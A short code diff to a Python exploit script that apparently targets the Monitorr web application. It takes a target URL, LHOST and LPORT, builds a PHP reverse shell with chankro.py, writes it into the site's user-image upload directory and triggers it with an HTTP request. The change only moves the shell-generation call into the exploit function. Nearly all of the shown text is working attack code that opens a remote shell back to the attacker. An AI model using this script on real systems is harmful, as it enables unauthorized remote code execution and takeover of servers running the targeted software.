@@ -28,6 +28,9 @@ def exploit():
         if len (sys.argv) != 4:
                 print ("[*] Use: python " + sys.argv[0] + " Target_URL LHOST LPORT")
         else:
+                # Generate shell
+                generate_shell()
+                
                 # Generate PHP Reverse Shell using shell.sh and chankro.py
                 cwd = os.getcwd()
                 generate_payload = os.system("python chankro.py --arch 64 --input " + cwd + "/" +  "shell.sh" + " --output rev.php --path /var/www/monitorr/assets/data/usrimg/")
@@ -46,5 +49,4 @@ def exploit():
                 requests.get(url, headers=headers, verify=False)
 
 if __name__ == '__main__':
-        generate_shell()
         exploit()
